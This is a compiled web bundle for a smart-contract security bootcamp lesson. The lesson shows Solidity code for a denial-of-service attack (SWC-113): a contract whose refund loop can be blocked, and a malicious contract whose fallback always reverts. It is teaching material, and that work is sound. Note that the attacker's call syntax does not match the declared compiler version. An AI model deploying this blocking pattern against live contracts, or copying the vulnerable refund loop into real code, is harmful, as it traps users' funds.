"use strict";(self.webpackChunkeducation_docs=self.webpackChunkeducation_docs||[]).push([[9248],{7902:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>a,default:()=>d,frontMatter:()=>s,metadata:()=>o,toc:()=>u});var c=n(4848),r=n(8453);const s={},a="DoS Attack Contract",o={id:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/index",title:"DoS Attack Contract",description:"This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert (SWC-113).",source:"@site/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/index.md",sourceDirName:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack",slug:"/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/",draft:!1,unlisted:!1,tags:[],version:"current",lastUpdatedBy:"oliver renwick",lastUpdatedAt:1721061896e3,frontMatter:{},sidebar:"docSidebar",previous:{title:"index",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack/"},next:{title:"Reentrancy Example",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack/"}},i={},u=[];function l(e){const t={a:"a",code:"code",h1:"h1",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(t.h1,{id:"dos-attack-contract",children:"DoS Attack Contract"}),"\n",(0,c.jsxs)(t.p,{children:["This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert (",(0,c.jsx)(t.a,{href:"https://swcregistry.io/docs/SWC-113",children:"SWC-113"}),")."]}),"\n",(0,c.jsxs)(t.p,{children:["The ",(0,c.jsx)(t.code,{children:"VulnerableContract"})," loops over the subscribers array, making a transfer to each address. This is dangerous because when the ",(0,c.jsx)(t.code,{children:"refundFees()"})," function is called and the ",(0,c.jsx)(t.code,{children:"VulnerableContract"})," attempts to send funds to the ",(0,c.jsx)(t.code,{children:"MaliciousContract"}),", the ",(0,c.jsx)(t.code,{children:"MaliciousContract"})," fallback function is called, which stops execution and reverts. This transaction will never succeed and ",(0,c.jsx)(t.code,{children:"refundFees()"})," will never successfully execute, preventing any subscribers from getting their subscription fee back."]}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{children:'pragma solidity 0.8.4;\n\n// Example DenialOfService Attack  \ncontract VulnerableContract {    \n  address owner = msg.sender;    \n  address payable[] public subscribers;    \n  uint FEE_COST = 1 ether;          \n  \n  function subscribe() public payable {        \n    require(msg.value == FEE_COST, "Insufficient msg.value");        \n    subscribers.push(msg.sender);    \n  }          \n  \n  function refundFees() public {        \n    require(msg.sender == owner, "msg.sender should be owner");        \n    for(uint i = subscribers.length; i > 0; i--) {            \n      subscribers[i - 1].transfer(FEE_COST);            \n      subscribers.pop();        \n    }\n  }          \n  \n  function getBalance() view public returns(uint) {        \n    return address(this).balance;    \n  }          \n  \n  // Auxiliar function for demo. It wouldn\'t be present in a vulnerable contract    \n  function removeLastSubscriber() public {        \n    subscribers.pop();    \n  }\n  \n}  \n  \ncontract MaliciousContract {    \n  VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f);          \n  \n  function subscribe() public payable {        \n    vulnerableContract.subscribe.value(msg.value)();       \n  }          \n  \n  fallback() external payable {        \n    require(false);    \n  }\n}\n'})})]})}function d(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,c.jsx)(t,{...e,children:(0,c.jsx)(l,{...e})}):l(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>o});var c=n(6540);const r={},s=c.createContext(r);function a(e){const t=c.useContext(s);return c.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),c.createElement(s.Provider,{value:t},e.children)}}}]);